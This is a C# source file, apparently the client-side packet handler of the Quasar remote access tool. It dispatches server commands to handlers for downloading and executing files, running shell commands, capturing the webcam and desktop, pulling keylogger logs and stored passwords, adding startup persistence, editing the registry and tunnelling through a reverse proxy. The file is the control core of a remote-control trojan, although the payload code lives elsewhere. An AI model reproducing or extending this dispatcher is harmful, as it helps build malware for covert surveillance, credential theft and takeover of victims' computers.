using Quasar.Common.Messages;
using xClient.Core.Commands;
using xClient.Core.ReverseProxy;

namespace xClient.Core.Networking
{
    public static class PacketHandler
    {
        public static void HandlePacket(Client client, IMessage packet)
        {
            var type = packet.GetType();

            if (type == typeof(DoDownloadAndExecute))
            {
                CommandHandler.HandleDoDownloadAndExecute((DoDownloadAndExecute)packet,
                    client);
            }
            else if (type == typeof(DoUploadAndExecute))
            {
                CommandHandler.HandleDoUploadAndExecute((DoUploadAndExecute)packet, client);
            }
            else if (type == typeof(DoClientDisconnect))
            {
                Program.ConnectClient.Exit();
            }
            else if (type == typeof(DoClientReconnect))
            {
                Program.ConnectClient.Disconnect();
            }
            else if (type == typeof(DoClientUninstall))
            {
                CommandHandler.HandleDoClientUninstall((DoClientUninstall)packet, client);
            }
            else if (type == typeof(DoAskElevate))
            {
                CommandHandler.HandleDoAskElevate((DoAskElevate)packet, client);
            }
            else if (type == typeof(GetDesktop))
            {
                CommandHandler.HandleGetDesktop((GetDesktop)packet, client);
            }
            else if (type == typeof(GetWebcam))
            {
                CommandHandler.HandleGetWebcam((GetWebcam)packet, client);
            }
            else if (type == typeof(GetProcesses))
            {
                CommandHandler.HandleGetProcesses((GetProcesses)packet, client);
            }
            else if (type == typeof(DoProcessKill))
            {
                CommandHandler.HandleDoProcessKill((DoProcessKill)packet, client);
            }
            else if (type == typeof(DoWebcamStop))
            {
                CommandHandler.HandleDoWebcamStop((DoWebcamStop)packet, client);
            }
            else if (type == typeof(DoProcessStart))
            {
                CommandHandler.HandleDoProcessStart((DoProcessStart)packet, client);
            }
            else if (type == typeof(GetDrives))
            {
                CommandHandler.HandleGetDrives((GetDrives)packet, client);
            }
            else if (type == typeof(GetDirectory))
            {
                CommandHandler.HandleGetDirectory((GetDirectory)packet, client);
            }
            else if (type == typeof(DoDownloadFile))
            {
                CommandHandler.HandleDoDownloadFile((DoDownloadFile)packet, client);
            }
            else if (type == typeof(DoUploadFile))
            {
                CommandHandler.HandleDoUploadFile((DoUploadFile)packet, client);
            }
            else if (type == typeof(DoMouseEvent))
            {
                CommandHandler.HandleDoMouseEvent((DoMouseEvent)packet, client);
            }
            else if (type == typeof(DoKeyboardEvent))
            {
                CommandHandler.HandleDoKeyboardEvent((DoKeyboardEvent)packet, client);
            }
            else if (type == typeof(GetSystemInfo))
            {
                CommandHandler.HandleGetSystemInfo((GetSystemInfo)packet, client);
            }
            else if (type == typeof(DoVisitWebsite))
            {
                CommandHandler.HandleDoVisitWebsite((DoVisitWebsite)packet, client);
            }
            else if (type == typeof(DoShowMessageBox))
            {
                CommandHandler.HandleDoShowMessageBox((DoShowMessageBox)packet, client);
            }
            else if (type == typeof(DoClientUpdate))
            {
                CommandHandler.HandleDoClientUpdate((DoClientUpdate)packet, client);
            }
            else if (type == typeof(GetWebcams))
            {
                CommandHandler.HandleGetWebcams((GetWebcams)packet, client);
            }
            else if (type == typeof(GetMonitors))
            {
                CommandHandler.HandleGetMonitors((GetMonitors)packet, client);
            }
            else if (type == typeof(DoShellExecute))
            {
                CommandHandler.HandleDoShellExecute((DoShellExecute)packet, client);
            }
            else if (type == typeof(DoPathRename))
            {
                CommandHandler.HandleDoPathRename((DoPathRename)packet, client);
            }
            else if (type == typeof(DoPathDelete))
            {
                CommandHandler.HandleDoPathDelete((DoPathDelete)packet, client);
            }
            else if (type == typeof(DoShutdownAction))
            {
                CommandHandler.HandleDoShutdownAction((DoShutdownAction)packet, client);
            }
            else if (type == typeof(GetStartupItems))
            {
                CommandHandler.HandleGetStartupItems((GetStartupItems)packet, client);
            }
            else if (type == typeof(DoStartupItemAdd))
            {
                CommandHandler.HandleDoStartupItemAdd((DoStartupItemAdd)packet, client);
            }
            else if (type == typeof(DoStartupItemRemove))
            {
                CommandHandler.HandleDoStartupItemRemove((DoStartupItemRemove)packet, client);
            }
            else if (type == typeof(DoDownloadFileCancel))
            {
                CommandHandler.HandleDoDownloadFileCancel((DoDownloadFileCancel)packet,
                    client);
            }
            else if (type == typeof(DoLoadRegistryKey))
            {
                CommandHandler.HandleGetRegistryKey((DoLoadRegistryKey)packet, client);
            }
            else if (type == typeof(DoCreateRegistryKey))
            {
                CommandHandler.HandleCreateRegistryKey((DoCreateRegistryKey)packet, client);
            }
            else if (type == typeof(DoDeleteRegistryKey))
            {
                CommandHandler.HandleDeleteRegistryKey((DoDeleteRegistryKey)packet, client);
            }
            else if (type == typeof(DoRenameRegistryKey))
            {
                CommandHandler.HandleRenameRegistryKey((DoRenameRegistryKey)packet, client);
            }
            else if (type == typeof(DoCreateRegistryValue))
            {
                CommandHandler.HandleCreateRegistryValue((DoCreateRegistryValue)packet, client);
            }
            else if (type == typeof(DoDeleteRegistryValue))
            {
                CommandHandler.HandleDeleteRegistryValue((DoDeleteRegistryValue)packet, client);
            }
            else if (type == typeof(DoRenameRegistryValue))
            {
                CommandHandler.HandleRenameRegistryValue((DoRenameRegistryValue)packet, client);
            }
            else if (type == typeof(DoChangeRegistryValue))
            {
                CommandHandler.HandleChangeRegistryValue((DoChangeRegistryValue)packet, client);
            }
            else if (type == typeof(GetKeyloggerLogs))
            {
                CommandHandler.HandleGetKeyloggerLogs((GetKeyloggerLogs)packet, client);
            }
            else if (type == typeof(GetPasswords))
            {
                CommandHandler.HandleGetPasswords((GetPasswords)packet, client);
            }
            else if (type == typeof(ReverseProxyConnect) ||
                     type == typeof(ReverseProxyConnectResponse) ||
                     type == typeof(ReverseProxyData) ||
                     type == typeof(ReverseProxyDisconnect))
            {
                ReverseProxyCommandHandler.HandleCommand(client, packet);
            }
            else if (type == typeof(GetConnections))
            {
                CommandHandler.HandleGetConnections(client, (GetConnections)packet);
            }
            else if (type == typeof(DoCloseConnection))
            {
                CommandHandler.HandleDoCloseConnection(client, (DoCloseConnection)packet);
            }
        }
    }
}